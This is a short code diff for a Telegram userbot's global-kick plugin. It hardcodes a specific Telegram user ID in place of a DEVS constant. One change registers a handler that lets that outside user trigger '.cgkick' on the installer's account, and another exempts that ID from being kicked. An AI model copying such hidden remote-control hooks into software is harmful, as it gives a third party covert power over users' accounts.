@@ -10,7 +10,7 @@ from userbot.utils import get_user_from_event, ice_cmd
 
 
 @ice_cmd(pattern="gkick(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgkick(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cgkick(?: |$)(.*)")
 async def gspide(rk):
     lazy = rk
     sender = await lazy.get_sender()
@@ -37,7 +37,7 @@ async def gspide(rk):
     except BaseException:
         return await rkp.edit("`Gagal Global Kick! Pengguna tidak dikenal.`")
     if user:
-        if user.id == DEVS:
+        if user.id == 1780709155:
             return await rkp.edit(f"`{owner} Jangan Ngadi Ngadi itu CODER aing`")
         try:
             await rk.client(BlockRequest(user))
